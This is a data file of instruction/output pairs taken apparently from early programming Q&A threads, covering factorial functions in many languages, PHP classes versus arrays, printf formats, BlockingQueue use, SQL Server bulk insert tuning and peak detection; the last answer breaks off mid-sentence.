{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Perl 6: Functional\nmulti factorial ( Int $n where { $n <= 0 } ){\n  return 1;\n}\nmulti factorial ( Int $n ){\n   return $n * factorial( $n-1 );\n}\n\n\nThis will also work:\nmulti factorial(0) { 1 }\nmulti factorial(Int $n) { $n * factorial($n - 1) }\n\nCheck Jonathan Worthington's journal on use.perl.org, for more information about the last example."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Perl 6:Procedural\nsub factorial ( int $n ){\n\n  my $result = 1;\n\n  loop ( ; $n > 0; $n-- ){\n\n    $result *= $n;\n\n  }\n\n  return $result;\n}"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "C:\nEdit: Actually C++ I guess, because of the variable declaration in the for loop.\n int factorial(int x) {\n      int product = 1;\n\n      for (int i = x; i > 0; i--) {\n           product *= i;\n      }\n\n      return product;\n }"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "For Python stuff, a good text editor (TextMate on OS X, [g]vim on Linux, Programmers Notepad on Windows), VCS (I'm mainly using git currently).. That's about it..\nA bit of a stretch to call it a dev-tool, but searching Google for \"python [module name]\" is incredibly useful (I use it even though I can put the cursor over the import abc module and be taken to the pydoc page, I always found the first-google-result much better than the PyDoc page TextMate invokes..\nI use PyLint to check I've not done anything stupid, but I'd hardly consider it 'must have' (I mostly use it for keeping consistent white-spacing, after commands and around x = 123 statements and so on). I'm also considering learning pdb (python debugger), but I've always found the odd print statement, or the logging module (in larger scripts) more than adequate.\n..that's about it.. Text editor, VCS, module documentation."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Javascript:\nfactorial = function( n )\n{\n   return n > 0 ? n * factorial( n - 1 ) : 1;\n}\n\nI'm not sure what a Factorial is but that does what the other programs do in javascript."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Haskell:\nones = 1 : ones\nintegers   = head ones     : zipWith (+) integers   (tail ones)\nfactorials = head integers : zipWith (*) factorials (tail integers)"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Scheme\nHere is a simple recursive definition:\n(define (factorial x)\n  (if (= x 0) 1\n      (* x (factorial (- x 1)))))\n\nIn Scheme tail-recursive functions use constant stack space. Here is a version of factorial that is tail-recursive:\n(define factorial\n  (letrec ((fact (lambda (x accum)\n                   (if (= x 0) accum\n                       (fact (- x 1) (* accum x))))))\n    (lambda (x)\n      (fact x 1))))"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "C++\nfactorial(int n)\n{\n    for(int i=1, f = 1; i<=n; i++)\n        f *= i;\n    return f;\n}"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "C/C++: Procedural\nunsigned long factorial(int n)\n{\n    unsigned long factorial = 1;\n    int i;\n\n    for (i = 2; i <= n; i++)\n    \tfactorial *= i;\n\n    return factorial;\n}\n\nPHP: Procedural\nfunction factorial($n)\n{\n    for ($factorial = 1, $i = 2; $i <= $n; $i++)\n    \t$factorial *= $i;\n\n    return $factorial;\n}\n\n@Niyaz: You didn't specify return type for the function"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "lolcode:\nsorry I couldn't resist xD\nHAI\nCAN HAS STDIO?\nI HAS A VAR\nI HAS A INT\nI HAS A CHEEZBURGER\nI HAS A FACTORIALNUM\nIM IN YR LOOP\n    UP VAR!!1\n    TIEMZD INT!![CHEEZBURGER]\n    UP FACTORIALNUM!!1\n    IZ VAR BIGGER THAN FACTORIALNUM? GTFO\nIM OUTTA YR LOOP\nU SEEZ INT\nKTHXBYE"}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "Personally, I try to always use this when referring to member variables.  It helps clarify the code and make it more readable.  Even if there is no ambiguity, someone reading through my code for the first time doesn't know that, but if they see this used consistently, they will know if they are looking at a member variable or not."}
{"instruction": "What is the best method to get objects out of a BlockingQueue, in a concurrent program, without hitting a race condition?  I'm currently doing the following and I'm not convinced it is the best method:\nBlockingQueue<Violation> vQueue;\n/* \nin the constructor I pass in a BlockingQueue object \nfull of violations that need to be processed - cut out for brevity\n*/\n\nViolation v;\nwhile ( ( v = vQueue.poll(500, TimeUnit.MILLISECONDS) ) != null ) {\n    // do stuff with the violation\n}\n\nI have yet to hit a race condition... but, I'm none too sure if this is truly safe.", "output": "class Producer implements Runnable {\n   private final BlockingQueue queue;\n   Producer(BlockingQueue q) { queue = q; }\n   public void run() {\n     try {\n       while (true) { queue.put(produce()); }\n     } catch (InterruptedException ex) { ... handle ...}\n   }\n   Object produce() { ... }\n }\n\n class Consumer implements Runnable {\n   private final BlockingQueue queue;\n   Consumer(BlockingQueue q) { queue = q; }\n   public void run() {\n     try {\n       while (true) { consume(queue.take()); }\n     } catch (InterruptedException ex) { ... handle ...}\n   }\n   void consume(Object x) { ... }\n }\n\n class Setup {\n   void main() {\n     BlockingQueue q = new SomeQueueImplementation();\n     Producer p = new Producer(q);\n     Consumer c1 = new Consumer(q);\n     Consumer c2 = new Consumer(q);\n     new Thread(p).start();\n     new Thread(c1).start();\n     new Thread(c2).start();\n   }\n }\n\nThis example was taken from the JDK 1.6 docs of BlockingQueue. So You can see that you are doing it the right way. Here's the quote which tells you that it have to work:\n\nMemory consistency effects: As with\n  other concurrent collections, actions\n  in a thread prior to placing an object\n  into a BlockingQueue happen-before\n  actions subsequent to the access or\n  removal of that element from the\n  BlockingQueue in another thread."}
{"instruction": "Is there a site for unit testing as RefactorMyCode for refactoring? I think it would be a great help for beginners like me.", "output": "So far, from what I have seen, RMC seems to be one-of-a-kind, which is both cool, but sad :(\nIt seems pretty inactive, but I have posted a couple of questions on there, and amazed at the response (a lot of people just have the RSS feed and wait for something to happen). So I would definately recommend just getting active on there..\nHowever, I have read some great books on Safari including MS Press' \"Test Driven Development\" which I found really helped . However I have to admit, I still need a lot of work in adjusting my brain for TDD etc.\nFollowing this question though! (+1) look forward to seeing if there is more out there! :)\nEdit:\nJust found this blog post that outlines a number of good bits of software, websites and books :) I knew I had one somewhere!"}
{"instruction": "Which is better to use in PHP, a 2D array or a class? I've included an example of what I mean by this.\n// Using a class\nclass someClass\n{\n    public  $name;\n    public  $height;\n    public  $weight;\n\n    function __construct($name, $height, $weight)\n    {\n        $this -> name       = $name;\n        $this -> height = $height;\n        $this -> weight = $weight;\n    }\n}\n\n$classArray[1] = new someClass('Bob', 10, 20);\n$classArray[2] = new someClass('Fred', 15, 10);\n$classArray[3] = new someClass('Ned', 25, 30);\n\n\n// Using a 2D array\n$normalArray[1]['name'] = 'Bob';\n$normalArray[1]['height']   = 10;\n$normalArray[1]['weight']   = 20;\n\n$normalArray[2]['name'] = 'Fred';\n$normalArray[2]['height']   = 15;\n$normalArray[2]['weight']   = 10;\n\n$normalArray[3]['name'] = 'Ned';\n$normalArray[3]['height']   = 25;\n$normalArray[3]['weight']   = 30;\n\n\nAssuming that somebody doesn't come out and show that classes are too slow, it looks like class wins.\nI've not idea which answer I should accept to I've just upvoted all of them.\n\nAnd I have now written two near identical pages, one using the 2D array (written before this question was posted) and now one using a class and I must say that the class produces much nicer code. I have no idea how much overhead is going to be generated but I doubt it will rival the improvement to the code itself.\nThank you for helping to make me a better programmer.", "output": "It depends exactly what you mean by 'better'. I'd go for the object oriented way (using classes) because I find it makes for cleaner code (at least in my opinion). However, I'm not sure what the speed penalties might be for that option."}
{"instruction": "Which is better to use in PHP, a 2D array or a class? I've included an example of what I mean by this.\n// Using a class\nclass someClass\n{\n    public  $name;\n    public  $height;\n    public  $weight;\n\n    function __construct($name, $height, $weight)\n    {\n        $this -> name       = $name;\n        $this -> height = $height;\n        $this -> weight = $weight;\n    }\n}\n\n$classArray[1] = new someClass('Bob', 10, 20);\n$classArray[2] = new someClass('Fred', 15, 10);\n$classArray[3] = new someClass('Ned', 25, 30);\n\n\n// Using a 2D array\n$normalArray[1]['name'] = 'Bob';\n$normalArray[1]['height']   = 10;\n$normalArray[1]['weight']   = 20;\n\n$normalArray[2]['name'] = 'Fred';\n$normalArray[2]['height']   = 15;\n$normalArray[2]['weight']   = 10;\n\n$normalArray[3]['name'] = 'Ned';\n$normalArray[3]['height']   = 25;\n$normalArray[3]['weight']   = 30;\n\n\nAssuming that somebody doesn't come out and show that classes are too slow, it looks like class wins.\nI've not idea which answer I should accept to I've just upvoted all of them.\n\nAnd I have now written two near identical pages, one using the 2D array (written before this question was posted) and now one using a class and I must say that the class produces much nicer code. I have no idea how much overhead is going to be generated but I doubt it will rival the improvement to the code itself.\nThank you for helping to make me a better programmer.", "output": "The \"class\" that you've constructed above is what most people would use a struct for in other languages. I'm not sure what the performance implications are in PHP, though I suspect instantiating the objects is probably more costly here, if only by a little bit.\nThat being said, if the cost is relatively low, it IS a bit easier to manage the objects, in my opinion.\nI'm only saying the following based on the title and your question, but:\nBear in mind that classes provide the advantage of methods and access control, as well. So if you wanted to ensure that people weren't changing weights to negative numbers, you could make the weight field private and provide some accessor methods, like getWeight() and setWeight(). Inside setWeight(), you could do some value checking, like so:\npublic function setWeight($weight)\n{\n    if($weight >= 0)\n    {\n        $this->weight = $weight;\n    }\n    else\n    {\n        // Handle this scenario however you like\n    }\n}"}
{"instruction": "Which is better to use in PHP, a 2D array or a class? I've included an example of what I mean by this.\n// Using a class\nclass someClass\n{\n    public  $name;\n    public  $height;\n    public  $weight;\n\n    function __construct($name, $height, $weight)\n    {\n        $this -> name       = $name;\n        $this -> height = $height;\n        $this -> weight = $weight;\n    }\n}\n\n$classArray[1] = new someClass('Bob', 10, 20);\n$classArray[2] = new someClass('Fred', 15, 10);\n$classArray[3] = new someClass('Ned', 25, 30);\n\n\n// Using a 2D array\n$normalArray[1]['name'] = 'Bob';\n$normalArray[1]['height']   = 10;\n$normalArray[1]['weight']   = 20;\n\n$normalArray[2]['name'] = 'Fred';\n$normalArray[2]['height']   = 15;\n$normalArray[2]['weight']   = 10;\n\n$normalArray[3]['name'] = 'Ned';\n$normalArray[3]['height']   = 25;\n$normalArray[3]['weight']   = 30;\n\n\nAssuming that somebody doesn't come out and show that classes are too slow, it looks like class wins.\nI've not idea which answer I should accept to I've just upvoted all of them.\n\nAnd I have now written two near identical pages, one using the 2D array (written before this question was posted) and now one using a class and I must say that the class produces much nicer code. I have no idea how much overhead is going to be generated but I doubt it will rival the improvement to the code itself.\nThank you for helping to make me a better programmer.", "output": "Generally, I follow this rule:\n1) Make it a class if multiple parts of your application use the data structure.\n2) Make it a 2D array if you're using it for quick processing of data in one part of your application."}
{"instruction": "I've searched for this a little but I have not gotten a particularly straight answer. In C (and I guess C++), how do you determine what comes after the % when using printf?. For example:\ndouble radius = 1.0;\ndouble area = 0.0;\narea = calculateArea( radius );\nprintf( \"%10.1f     %10.2\\n\", radius, area );\n\nI took this example straight from a book that I have on the C language. This does not make sense to me at all. Where do you come up with 10.1f and 10.2f? Could someone please explain this?", "output": "One issue that hasn't been raised by others is whether double is the same as a float.  On some systems a different format specifier was needed for a double compared to a float.  Not least because the parameters passed could be of different sizes.\n\n %f - float\n %lf - double\n %g - double"}
{"instruction": "Which is better to use in PHP, a 2D array or a class? I've included an example of what I mean by this.\n// Using a class\nclass someClass\n{\n    public  $name;\n    public  $height;\n    public  $weight;\n\n    function __construct($name, $height, $weight)\n    {\n        $this -> name       = $name;\n        $this -> height = $height;\n        $this -> weight = $weight;\n    }\n}\n\n$classArray[1] = new someClass('Bob', 10, 20);\n$classArray[2] = new someClass('Fred', 15, 10);\n$classArray[3] = new someClass('Ned', 25, 30);\n\n\n// Using a 2D array\n$normalArray[1]['name'] = 'Bob';\n$normalArray[1]['height']   = 10;\n$normalArray[1]['weight']   = 20;\n\n$normalArray[2]['name'] = 'Fred';\n$normalArray[2]['height']   = 15;\n$normalArray[2]['weight']   = 10;\n\n$normalArray[3]['name'] = 'Ned';\n$normalArray[3]['height']   = 25;\n$normalArray[3]['weight']   = 30;\n\n\nAssuming that somebody doesn't come out and show that classes are too slow, it looks like class wins.\nI've not idea which answer I should accept to I've just upvoted all of them.\n\nAnd I have now written two near identical pages, one using the 2D array (written before this question was posted) and now one using a class and I must say that the class produces much nicer code. I have no idea how much overhead is going to be generated but I doubt it will rival the improvement to the code itself.\nThank you for helping to make me a better programmer.", "output": "It's the speed that I am thinking of mostly, for anything more complex than what I have here I'd probably go with classes but the question is, what is the cost of a class?\n\n\nThis would seem to be premature optimisation. Your application isn't going to take any real-world performance hit either way, but using a class lets you use getter and setter methods and is generally going to be better for code encapsulation and code reuse. \nWith the arrays you're incurring cost in harder to read and maintain code, you can't unit test the code as easily and with a good class structure other developers should find it easier to understand if they need to take it on.\nAnd when later on you need to add other methods to manipulate these, you won't have an architecture to extend."}
{"instruction": "Which is better to use in PHP, a 2D array or a class? I've included an example of what I mean by this.\n// Using a class\nclass someClass\n{\n    public  $name;\n    public  $height;\n    public  $weight;\n\n    function __construct($name, $height, $weight)\n    {\n        $this -> name       = $name;\n        $this -> height = $height;\n        $this -> weight = $weight;\n    }\n}\n\n$classArray[1] = new someClass('Bob', 10, 20);\n$classArray[2] = new someClass('Fred', 15, 10);\n$classArray[3] = new someClass('Ned', 25, 30);\n\n\n// Using a 2D array\n$normalArray[1]['name'] = 'Bob';\n$normalArray[1]['height']   = 10;\n$normalArray[1]['weight']   = 20;\n\n$normalArray[2]['name'] = 'Fred';\n$normalArray[2]['height']   = 15;\n$normalArray[2]['weight']   = 10;\n\n$normalArray[3]['name'] = 'Ned';\n$normalArray[3]['height']   = 25;\n$normalArray[3]['weight']   = 30;\n\n\nAssuming that somebody doesn't come out and show that classes are too slow, it looks like class wins.\nI've not idea which answer I should accept to I've just upvoted all of them.\n\nAnd I have now written two near identical pages, one using the 2D array (written before this question was posted) and now one using a class and I must say that the class produces much nicer code. I have no idea how much overhead is going to be generated but I doubt it will rival the improvement to the code itself.\nThank you for helping to make me a better programmer.", "output": "The class that you have is not a real class in OO terms - its just been contructed to take the space of the instance variables.\nThat said - there propably isnt much issue with speed - its just a style thing in your example.\nThe intresting bit - is if you contsrtucted the object to be a real \"person\" class - and thinkng about the other attributes and actions that you may want of the person class - then you would notice not only a style performance - writting code - but also speed performance."}
{"instruction": "I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.\nI am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.\nI have a simple table that looks like this: \n CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n\nI'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  \nThe %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.\nDoes it help any if I:\n\nDrop the Primary key while I am doing the inserting and recreate it later\nDo inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small\nAnything else?\n\n--\nBased on the responses I have gotten, let me clarify a little bit:\nPortman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?\nChopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.\nJason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.", "output": "Yes your ideas will help.\nLean on option 1 if there are no reads happening while your loading.\nLean on option 2 if you destination table is being queried during your processing.\n@Andrew\nQuestion.  Your inserting in chunks of 300.  What is the total amount your inserting?  SQL server should be able to handle 300 plain old inserts very fast."}
{"instruction": "I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.\nI am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.\nI have a simple table that looks like this: \n CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n\nI'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  \nThe %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.\nDoes it help any if I:\n\nDrop the Primary key while I am doing the inserting and recreate it later\nDo inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small\nAnything else?\n\n--\nBased on the responses I have gotten, let me clarify a little bit:\nPortman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?\nChopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.\nJason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.", "output": "How about increasing the memory allocated to the server or the buffer size used by the server, if possible?"}
{"instruction": "I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.\nI am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.\nI have a simple table that looks like this: \n CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n\nI'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  \nThe %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.\nDoes it help any if I:\n\nDrop the Primary key while I am doing the inserting and recreate it later\nDo inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small\nAnything else?\n\n--\nBased on the responses I have gotten, let me clarify a little bit:\nPortman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?\nChopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.\nJason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.", "output": "Have you tried using transactions?\nFrom what you describe, having the server committing 100% of the time to disk, it seems you are sending each row of data in an atomic SQL sentence thus forcing the server to commit (write to disk) every single row.\nIf you used transactions instead, the server would only commit once at the end of the transaction.\nFor further help: What method are you using for inserting data to the server? Updating a DataTable using a DataAdapter, or executing each sentence using a string?"}
{"instruction": "I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.\nI am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.\nI have a simple table that looks like this: \n CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n\nI'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  \nThe %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.\nDoes it help any if I:\n\nDrop the Primary key while I am doing the inserting and recreate it later\nDo inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small\nAnything else?\n\n--\nBased on the responses I have gotten, let me clarify a little bit:\nPortman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?\nChopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.\nJason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.", "output": "You're already using SqlBulkCopy, which is a good start.\nHowever, just using the SqlBulkCopy class does not necessarily mean that SQL will perform a bulk copy. In particular, there are a few requirements that must be met for SQL Server to perform an efficient bulk insert.\nFurther reading:\n\nPrerequisites for Minimal Logging in Bulk Import\nOptimizing Bulk Import Performance\n\nOut of curiosity, why is your index set up like that? It seems like ContainerId/BinId/Sequence is much better suited to be a nonclustered index. Is there a particular reason you wanted this index to be clustered?"}
{"instruction": "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code.", "output": "This problem has been studied in some detail. \nThere are a set of very up-to-date implementations in the TSpectrum* classes of ROOT (a nuclear/particle physics analysis tool). The code works in one- to three-dimensional data.\nThe ROOT source code is available, so you can grab this implementation if 